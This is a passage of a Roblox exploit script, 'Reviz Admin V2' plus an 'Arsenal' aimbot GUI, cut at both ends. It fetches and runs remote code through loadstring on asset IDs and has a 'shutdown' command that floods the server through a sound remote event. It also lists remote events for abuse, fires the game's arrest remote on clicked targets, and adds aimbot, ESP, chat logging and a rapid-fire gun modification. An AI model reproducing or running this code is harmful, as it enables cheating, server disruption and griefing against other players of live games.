                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unglitch") then
            lplayer.Character.HumanoidRootPart.Glitch:Destroy()
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
            b = Instance.new("BodyForce")
            b.Parent = lplayer.Character.HumanoidRootPart
            b.Name = "unGlitch"
            b.Force = Vector3.new(0,-5000000,0)
            wait(2)
            lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("grespawn") then
            lplayer.Character.Humanoid.Health = 0
            wait(1)
            lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
            lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("explorer") then
            loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "DEX Explorer has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("anim ") then
            local Anim = Instance.new("Animation")
            Anim.AnimationId = "rbxassetid://"..(string.sub(CMDBAR.Text, 6))
            local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
            track:Play(.1, 1, 1)
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("animgui") then
            loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "Energize Animations GUI has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("savepos") then
            saved = lplayer.Character.HumanoidRootPart.CFrame
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Position Saved";
            Text = "Use ;loadpos to return to saved position.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("loadpos") then
            lplayer.Character.HumanoidRootPart.CFrame = saved
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("bang ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                local Anim2 = Instance.new("Animation")
                Anim2.AnimationId = "rbxassetid://148840371"
                local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
                track2:Play(.1, 1, 1)
                bplrr = v.Name
                banpl = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unbang") then
            banpl = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("bringmod ") then
            local function bringmodw()
            for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
            if obj.Name == (string.sub(CMDBAR.Text, 10)) then
            for i,ch in pairs(obj:GetDescendants()) do
            if (ch:IsA("BasePart")) then
            ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            ch.CanCollide = false
            ch.Transparency = 0.7
            wait()
            ch.CFrame = lplayer.Character["Left Leg"].CFrame
            wait()
            ch.CFrame = lplayer.Character["Right Leg"].CFrame
            wait()
            ch.CFrame = lplayer.Character["Head"].CFrame
            end
            end
            end
            end
            end
            while wait() do
                bringmodw()
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BringMod";
            Text = "BringMod enabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("respawn") then
            local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
            local hum = Instance.new('Humanoid', mod)
            local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
            lplayer.Character = mod
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("shutdown") then
            game:GetService'RunService'.Stepped:Connect(function()
            pcall(function()
                for i,v in pairs(game:GetService'Players':GetPlayers()) do
                    if v.Character ~= nil and v.Character:FindFirstChild'Head' then
                        for _,x in pairs(v.Character.Head:GetChildren()) do
                            if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
                        end
                    end
                end
            end)
            end)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Attempting Shutdown";
            Text = "Shutdown Attempt has begun.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("delobj ") then
            objtodel = (string.sub(CMDBAR.Text, 8))
            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if v.Name == objtodel then
                    v:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("getplrs") then
            for i,v in pairs(game:GetService("Players"):GetPlayers())do
                print(v)
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printed";
            Text = "Players have been printed to console. (F9)";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("deldecal") then
            for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
                if (v:IsA("Decal")) then
                    v:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("opfinality") then
            loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "OpFinality GUI has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("remotes") then
            remotes = true
            added = true
            game.DescendantAdded:connect(function(rmt)
            if added == true then
            if remotes == true then
            if rmt:IsA("RemoteEvent") then
            print("A RemoteEvent was added!")
            print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
            print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
            end end end
            end)
            game.DescendantAdded:connect(function(rmtfnctn)
            if added == true then
            if remotes == true then
            if rmtfnctn:IsA("RemoteFunction") then
            warn("A RemoteFunction was added!")
            warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
            print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
            end end end
            end)
           
            game.DescendantAdded:connect(function(bndfnctn)
            if added == true then
            if binds == true then
            if bndfnctn:IsA("BindableFunction") then
            print("A BindableFunction was added!")
            print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
            print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
            end end end
            end)
           
            game.DescendantAdded:connect(function(bnd)
            if added == true then
            if binds == true then
            if bnd:IsA("BindableEvent") then
            warn("A BindableEvent was added!")
            warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
            print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
            end end end
            end)
           
           
            if binds == true then
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("BindableFunction") then
            print(" game." .. v:GetFullName() .. " | BindableFunction")
            print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
            end end
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("BindableEvent") then
            warn(" game." .. v:GetFullName() .. " | BindableEvent")
            print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
            end end
            else
            print("Off")
            end
            if remotes == true then
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteFunction") then
            warn(" game." .. v:GetFullName() .. " | RemoteFunction")
            print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
            end end
            wait()
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then
            print(" game." .. v:GetFullName() .. " | RemoteEvent")
            print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
            end end
            else
            print("Off")
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printing Remotes";
            Text = "Type ;noremotes to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("noremotes") then
            remotes = false
            added = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printing Remotes Disabled";
            Text = "Type ;remotes to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("tpdefault") then
            spin = false
            followed = false
            traill = false
            noclip = false
            annoying = false
            hwalk = false
            cbringing = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("stopsit") then
            stopsitting = true
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("gosit") then
            stopsitting = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("version") then
            print(adminversion)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Version";
            Text = adminversion;
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("clicktp") then
            clickgoto = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Click TP";
            Text = "Press E to teleport to mouse position";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("noclicktp") then
            clickgoto = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Click TP";
            Text = "Click TP has been disabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("toolson") then
            gettingtools = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools Enabled";
            Text = "Automatically colleting tools dropped.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("toolsoff") then
            gettingtools = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools Disabled";
            Text = "Click TP has been disabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("delcmdbar") then
            ScreenGui:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("reset") then
            lplayer.Character.Head:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("state ") then
            statechosen = string.sub(CMDBAR.Text, 7)
            changingstate = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("gravity ") then
            game:GetService("Workspace").Gravity = string.sub(CMDBAR.Text, 9)
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("looprhats") then
        removingmeshhats = true
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unlooprhats") then
            removingmeshhats = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("looprtool") then
            removingmeshtool = true
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unlooprtool") then
            removingmeshtool = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("givetool ") then
            for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
                if v:IsA("Tool") then
                    for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                        v.Parent = player.Character
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("age ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
            end
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("id ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 4))) do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == (".age ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = player.AccountAge.." Days";
                Text = "Account age of "..player.Name;
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 4) == (".id ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = player.UserId.." ID";
                Text = "Account ID of "..player.Name;
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("gameid") then
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Game ID";
            Text = "Game ID: ".. game.GameId;
            })
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("pgs") then
            local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
            if pgscheck == true then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "PGSPhysicsSolverEnabled";
                Text = "PGS is Enabled!";
                })
            else
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "PGSPhysicsSolverEnabled";
                Text = "PGS is Disabled!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("removeinvis") then
            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if v:IsA("Part") then
                    if v.Transparency == 1 then
                        if v.Name ~= "HumanoidRootPart" then
                            v:Destroy()
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("removefog") then
            game:GetService("Lighting").FogStart = 0
            game:GetService("Lighting").FogEnd = 9999999999999
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("disable") then
            lplayer.Character.Humanoid.Parent = lplayer
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("enable") then
            lplayer.Humanoid.Parent = lplayer.Character
        end
        if string.sub(CMDBAR.Text, 1, 13) == ("givealltools ") then
            for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
                if v:IsA("Tool") then
                    v.Parent = lplayer.Character
                    wait()
                    for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 14))) do
                        v.Parent = player.Character
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("flyspeed ") then
            speedfly = string.sub(CMDBAR.Text, 10)
            wait()
            change()
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("carpet ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                local Anim3 = Instance.new("Animation")
                Anim3.AnimationId = "rbxassetid://282574440"
                local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
                track3:Play(.1, 1, 1)
                bplrr = v.Name
                banpl = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("uncarpet") then
            banpl = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("stare ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                staring = true
                stareplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unstare") then
            staring = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("logchat") then
            chatlogs = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "LogChat enabled";
            Text = "Now logging all player chat.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("unlogchat") then
            chatlogs = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "LogChat disabled";
            Text = "Stopped logging all player chat.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("fixcam") then
            game:GetService("Workspace").CurrentCamera:Destroy()
            wait(0.1)
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
            game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
            lplayer.CameraMinZoomDistance = 0.5
            lplayer.CameraMaxZoomDistance = 400
            lplayer.CameraMode = "Classic"
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unstate") then
            changingstate = false
        end
        CMDBAR.Text = ""
    end
end)
 
wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Loaded successfully!";
    Text = "Reviz Admin V2 by illremember";
})
wait(0.1)
print("Reviz Admin V2 loaded!")
if game:GetService("Workspace").FilteringEnabled == true then
    warn("FE is Enabled (Filtering Enabled)")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE is Enabled";
        Text = "Filtering Enabled. Enjoy using Reviz Admin!";
    })
else
    warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE is Disabled";
        Text = "Filtering Disabled. Consider using a different admin script.";
    })
end
 
local intro = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
intro.Parent = game:GetService("CoreGui")
Frame.Parent = intro
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.Size = UDim2.new(1, 0, 0, 300)
Frame.Position = UDim2.new(0, 0, -0.4, 0)
ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0, 0, 0, 0)
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.Image = "http://www.roblox.com/asset/?id=1542162618"
Frame:TweenPosition(UDim2.new(0, 0, 0.2, 0), "Out", "Elastic", 3)
wait(3.01)
Frame:TweenPosition(UDim2.new(0, 0, 1.5, 0), "Out", "Elastic", 5)
wait(5.01)
intro:Destroy()
end)

arrest.Name = "arrest"
arrest.Parent = main
arrest.BackgroundColor3 = Color3.new(0, 1, 1)
arrest.Position = UDim2.new(0.349623203, 0, 0.306112915, 0)
arrest.Size = UDim2.new(0, 110, 0, 32)
arrest.Font = Enum.Font.GothamBlack
arrest.Text = "Arrest"
arrest.TextColor3 = Color3.new(1, 0, 0)
arrest.TextSize = 14
arrest.MouseButton1Down:connect(function()
local mouse = game.Players.LocalPlayer:GetMouse()
local arrestEvent = game.Workspace.Remote.arrest
mouse.Button1Down:connect(function()
local obj = mouse.Target
local response = arrestEvent:InvokeServer(obj)
 end)
end)

attach.Name = "attach"
attach.Parent = main
attach.BackgroundColor3 = Color3.new(0, 1, 1)
attach.Position = UDim2.new(0.679666638, 0, 0.304921538, 0)
attach.Size = UDim2.new(0, 111, 0, 32)
attach.Font = Enum.Font.GothamBlack
attach.Text = "Aimbot"
attach.TextColor3 = Color3.new(1, 0, 0)
attach.TextSize = 14
attach.MouseButton1Down:connect(function()
local plrs = game:GetService("Players")
local TeamBased = true ; local teambasedswitch = "o"
local presskeytoaim = true; local aimkey = "e"
local raycast = false

local espupdatetime = 5; autoesp = false



local lockaim = true; local lockangle = 5



--function findwat(folder, what)
--	for i, smth in pairs(folder:GetChildren()) do
--		if string.find(string.lower(tostring(smth)), string.lower(what)) then
--			return smth
--		end
--	end
--end
--
--local plrs = findwat(game, "Players")




local Gui = Instance.new("ScreenGui")
local Move = Instance.new("Frame")
local Main = Instance.new("Frame")
local EspStatus = Instance.new("TextLabel")
local st1 = Instance.new("TextLabel")
local st1_2 = Instance.new("TextLabel")
local st1_3 = Instance.new("TextLabel")
local Name = Instance.new("TextLabel")
--Properties:
Gui.Name = "Gui"
Gui.Parent = plrs.LocalPlayer:WaitForChild("PlayerGui")

Move.Name = "Move"
Move.Parent = Gui
Move.BackgroundColor3 = Color3.new(0.545098, 0, 0)
Move.BackgroundTransparency = 1
Move.BorderSizePixel = 0
Move.Draggable = true
Move.Position = UDim2.new(0.005, 0, -0.15, 0)
Move.Size = UDim2.new(0.28141585, 0, 0.0320388414, 0)

Main.Name = "Main"
Main.Parent = Move
Main.BackgroundColor3 = Color3.new(1, 1, 1)
Main.Position = UDim2.new(0, -7, 20.9960003, 0)
Main.Size = UDim2.new(1, 0, 5.79699993, 0)
Main.Style = Enum.FrameStyle.RobloxSquare

EspStatus.Name = "EspStatus"
EspStatus.Parent = Main
EspStatus.BackgroundColor3 = Color3.new(1, 1, 1)
EspStatus.BackgroundTransparency = 1
EspStatus.Position = UDim2.new(0, 0, 0.300000012, 0)
EspStatus.Size = UDim2.new(1, 0, 0.162, 0)
EspStatus.Font = Enum.Font.ArialBold
EspStatus.Text = "Press O to change team based mode"
EspStatus.TextColor3 = Color3.new(0.6, 0.196078, 0.8)
EspStatus.TextScaled = true
EspStatus.TextWrapped = true

st1.Name = "st1"
st1.Parent = Main
st1.BackgroundColor3 = Color3.new(1, 1, 1)
st1.BackgroundTransparency = 1
st1.Position = UDim2.new(0.271787882, 0, 0, 0)
st1.Size = UDim2.new(0.728211343, 0, 0.161862016, 0)
st1.Font = Enum.Font.ArialBold
st1.Text = ""
st1.TextColor3 = Color3.new(0.0784314, 0.541176, 0)
st1.TextScaled = true
st1.TextSize = 14
st1.TextWrapped = true

st1_2.Name = "st1"
st1_2.Parent = Main
st1_2.BackgroundColor3 = Color3.new(1, 1, 1)
st1_2.BackgroundTransparency = 1
st1_2.Position = UDim2.new(0, 0, 0.875999987, 0)
st1_2.Size = UDim2.new(0.999999881, 0, 0.161862016, 0)
st1_2.Font = Enum.Font.ArialBold
st1_2.Text = "Press E to lock on a person inside ur view"
st1_2.TextColor3 = Color3.new(0.6, 0.196078, 0.8)
st1_2.TextScaled = true
st1_2.TextWrapped = true

st1_3.Name = "st1"
st1_3.Parent = Main
st1_3.BackgroundColor3 = Color3.new(1, 1, 1)
st1_3.BackgroundTransparency = 1
st1_3.Position = UDim2.new(0, 0, 0.54, 0)
st1_3.Size = UDim2.new(1, 0, 0.261999995, 0)
st1_3.Font = Enum.Font.ArialBold
st1_3.Text = "Press L to enable esp loop and press T to update esp"
st1_3.TextColor3 = Color3.new(0.6, 0.196078, 0.8)
st1_3.TextScaled = true
st1_3.TextWrapped = true


Name.Name = "Name"
Name.Parent = Move
Name.BackgroundColor3 = Color3.new(0.545098, 0, 0)
Name.BackgroundTransparency = 1
Name.Position = UDim2.new(0, 25, 20.9860001, 0)
Name.Size = UDim2.new(0.838, 0, 1.27999997, 0)
Name.Font = Enum.Font.Arcade
Name.Text = "ARSENAL GUI"
Name.TextColor3 = Color3.new(0.541176, 0.168627, 0.886275)
Name.TextScaled = true
Name.TextSize = 12
Name.TextWrapped = true
-- Scripts:


local plrsforaim = {}

local lplr = game:GetService("Players").LocalPlayer
Move.Draggable = true
Gui.ResetOnSpawn = false
Gui.Name = "Chat"
Gui.DisplayOrder = 999

	Gui.Parent = plrs.LocalPlayer.PlayerGui


f = {}
local espforlder

f.addesp = function()
	--print("ESP ran")
	if espforlder then
	else
		espforlder = Instance.new("Folder")
		espforlder.Parent = game.Workspace.CurrentCamera
	end
	for i, v in pairs(espforlder:GetChildren()) do
		v:Destroy()
	end
	for _, plr in pairs(plrs:GetChildren()) do
		if plr.Character and plr.Character.Humanoid.Health > 0 and plr.Name ~= lplr.Name then
			if TeamBased == true then
				if plr.Team.Name ~= plrs.LocalPlayer.Team.Name  then
					local e = espforlder:FindFirstChild(plr.Name)
					if not e then
						--print("Added esp for team based")
						local bill = Instance.new("BillboardGui", espforlder)
						bill.Name = plr.Name
						bill.AlwaysOnTop = true
						bill.Size = UDim2.new(1,0,1,0)
						bill.Adornee = plr.Character.Head
						local Frame = Instance.new('Frame',bill)
						Frame.Active = true
						Frame.BackgroundColor3 = Color3.new(0.862745, 0.0784314, 0.235294)
						Frame.BackgroundTransparency = 0
						Frame.BorderSizePixel = 0
						Frame.AnchorPoint = Vector2.new(.5, .5)
						Frame.Position = UDim2.new (0.5,0,0.5,0)
						Frame.Size = UDim2.new (1,0,1,0)
						Frame.Rotation = 0
						plr.Character.Humanoid.Died:Connect(function()
							bill:Destroy()
						end)
					end
				end
			else
				local e = espforlder:FindFirstChild(plr.Name)
				if not e then
					--print("Added esp")
					local bill = Instance.new("BillboardGui", espforlder)
					bill.Name = plr.Name
					bill.AlwaysOnTop = true
					bill.Size = UDim2.new(1,0,1,0)
					bill.Adornee = plr.Character.Head
					local Frame = Instance.new('Frame',bill)
					Frame.Active = true
					Frame.BackgroundColor3 = Color3.new(0/255,255/255,0/255)
					Frame.BackgroundTransparency = 0
					Frame.BorderSizePixel = 0
					Frame.AnchorPoint = Vector2.new(.5, .5)
					Frame.Position = UDim2.new (0.5,0,0.5,0)
					Frame.Size = UDim2.new (1,0,1,0)
					Frame.Rotation = 0
					plr.Character.Humanoid.Died:Connect(function()
						bill:Destroy()
					end)
				end
			end
			
			
		end
	end
end
local cam = game.Workspace.CurrentCamera

local mouse = lplr:GetMouse()
local switch = false
local key = "k"
local aimatpart = nil
mouse.KeyDown:Connect(function(a)
	if a == "t" then
		print("worked1")
		f.addesp()
	elseif a == "u" then
		if raycast == true then
			raycast = false
		else
			raycast = true
		end
	elseif a == "l" then
		if autoesp == false then
			autoesp = true
		else
			autoesp = false
		end
	end
	if a == "j" then
		if mouse.Target then
			mouse.Target:Destroy()
		end
	end
	if a == key then
		if switch == false then
			switch = true
		else
			switch = false
			if aimatpart ~= nil then
				aimatpart = nil
			end
		end
	elseif a == teambasedswitch then
		if TeamBased == true then
			TeamBased = false
			teambasedstatus.Text = tostring(TeamBased)
		else
			TeamBased = true
			teambasedstatus.Text = tostring(TeamBased)
		end
	elseif a == aimkey then
		if not aimatpart then
			local maxangle = math.rad(20)
			for i, plr in pairs(plrs:GetChildren()) do
				if plr.Name ~= lplr.Name and plr.Character and plr.Character.Head and plr.Character.Humanoid and plr.Character.Humanoid.Health > 1 then
					if TeamBased == true then
						if plr.Team.Name ~= lplr.Team.Name then
							local an = checkfov(plr.Character.Head)
							if an < maxangle then
								maxangle = an
								aimatpart = plr.Character.Head
							end
						end
					else
						local an = checkfov(plr.Character.Head)
							if an < maxangle then
								maxangle = an
								aimatpart = plr.Character.Head
							end
							print(plr)
					end
					plr.Character.Humanoid.Died:Connect(function()
						if aimatpart.Parent == plr.Character or aimatpart == nil then
							aimatpart = nil
						end
					end)
				end
			end
		else
			aimatpart = nil
		end
	end
end)

function getfovxyz (p0, p1, deg)
	local x1, y1, z1 = p0:ToOrientation()
	local cf = CFrame.new(p0.p, p1.p)
	local x2, y2, z2 = cf:ToOrientation()
	--local d = math.deg
	if deg then
		--return Vector3.new(d(x1-x2), d(y1-y2), d(z1-z2))
	else
		return Vector3.new((x1-x2), (y1-y2), (z1-z2))
	end
end

function getaimbotplrs()
	plrsforaim = {}
	for i, plr in pairs(plrs:GetChildren()) do
		if plr.Character and plr.Character.Humanoid and plr.Character.Humanoid.Health > 0 and plr.Name ~= lplr.Name and plr.Character.Head then
			
			if TeamBased == true then
				if plr.Team.Name ~= lplr.Team.Name then
					local cf = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, plr.Character.Head.CFrame.p)
					local r = Ray.new(cf, cf.LookVector * 10000)
					local ign = {}
					for i, v in pairs(plrs.LocalPlayer.Character:GetChildren()) do
						if v:IsA("BasePart") then
							table.insert(ign , v)
						end
					end
					local obj = game.Workspace:FindPartOnRayWithIgnoreList(r, ign)
					if obj.Parent == plr.Character and obj.Parent ~= lplr.Character then
						table.insert(plrsforaim, obj)
					end
				end
			else
				local cf = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, plr.Character.Head.CFrame.p)
				local r = Ray.new(cf, cf.LookVector * 10000)
				local ign = {}
				for i, v in pairs(plrs.LocalPlayer.Character:GetChildren()) do
					if v:IsA("BasePart") then
						table.insert(ign , v)
					end
				end
				local obj = game.Workspace:FindPartOnRayWithIgnoreList(r, ign)
				if obj.Parent == plr.Character and obj.Parent ~= lplr.Character then
					table.insert(plrsforaim, obj)
				end
			end
			
			
		end
	end
end

function aimat(part)
	cam.CFrame = CFrame.new(cam.CFrame.p, part.CFrame.p)
end
function checkfov (part)
	local fov = getfovxyz(game.Workspace.CurrentCamera.CFrame, part.CFrame)
	local angle = math.abs(fov.X) + math.abs(fov.Y)
	return angle
end

game:GetService("RunService").RenderStepped:Connect(function()
	if aimatpart then
		aimat(aimatpart)
		if aimatpart.Parent == plrs.LocalPlayer.Character then
			aimatpart = nil
		end
	end
	
	
--	if switch == true then
--		local maxangle = 99999
--		
--		--print("Loop")
--		if true and raycast == false then
--			for i, plr in pairs(plrs:GetChildren()) do
--				if plr.Name ~= lplr.Name and plr.Character and plr.Character.Head and plr.Character.Humanoid and plr.Character.Humanoid.Health > 1 then
--					if TeamBased then
--						if plr.Team.Name ~= lplr.Team.Name or plr.Team.TeamColor ~= lplr.Team.TeamColor then
--							local an = checkfov(plr.Character.Head)
--							if an < maxangle then
--								maxangle = an
--								aimatpart = plr.Character.Head
--								if an < lockangle then
--									break
--								end
--							end
--						end
--					else
--						local an = checkfov(plr.Character.Head)
--							if an < maxangle then
--								maxangle = an
--								aimatpart = plr.Character.Head
--								if an < lockangle then
--									break
--								end
--							end
--					end
--					
--					
--					
--					
--				end
--			end
--		elseif raycast == true then
--			
--		end
		
		if raycast == true and switch == false and not aimatpart then
			getaimbotplrs()
			aimatpart = nil
			local maxangle = 999
			for i, v in ipairs(plrsforaim) do
				if v.Parent ~= lplr.Character then
					local an = checkfov(v)
					if an < maxangle and v ~= lplr.Character.Head then
						maxangle = an
						aimatpart = v
						print(v:GetFullName())
						v.Parent.Humanoid.Died:connect(function()
							aimatpart = nil
						end)
					end
				end
			end
		
	end
end)
delay(0, function()
	while wait(espupdatetime) do
		if autoesp == true then
			pcall(function()
			f.addesp()
			end)
		end
	end
end)
warn("loaded")
end)

fastrem.Name = "fastrem"
fastrem.Parent = main
fastrem.BackgroundColor3 = Color3.new(1, 0.333333, 0)
fastrem.Position = UDim2.new(0.00783289783, 0, 0.518048227, 0)
fastrem.Size = UDim2.new(0, 84, 0, 32)
fastrem.Font = Enum.Font.Bodoni
fastrem.Text = "Fast Remington"
fastrem.TextColor3 = Color3.new(0, 0, 0)
fastrem.TextSize = 14
fastrem.MouseButton1Down:connect(function()
local Player = game.Players.LocalPlayer.Name
local Gun = "Remington 870" -- < -- Gun Name
local Run = game:GetService("RunService")

Gun = game.Players[Player].Character[Gun]
local Mouse = game.Players.LocalPlayer:GetMouse()
local Down = false
local Sound = Gun.Handle.FireSound

function CreateRay(Point_A, Point_B)
local Ray = Ray.new(Point_A, (Point_B - Point_A).Unit * (2 ^ 31 - 1))
local Part, Pos = workspace:FindPartOnRay(Ray, game.Players.LocalPlayer.Character)
local Dist = (Point_A - Pos).Magnitude
local CFrame = CFrame.new(Point_A, Pos) * CFrame.new(0, 0, -Dist / 2)

return CFrame, Dist, Ray
end

function FireLaser(target)
coroutine.resume(coroutine.create(function()
local C, D, R = CreateRay(Gun.Muzzle.CFrame.p, target.CFrame.p)
local Bullet = Instance.new("Part", Gun)
Bullet.BrickColor = BrickColor.Yellow()
Bullet.Material = "Neon"
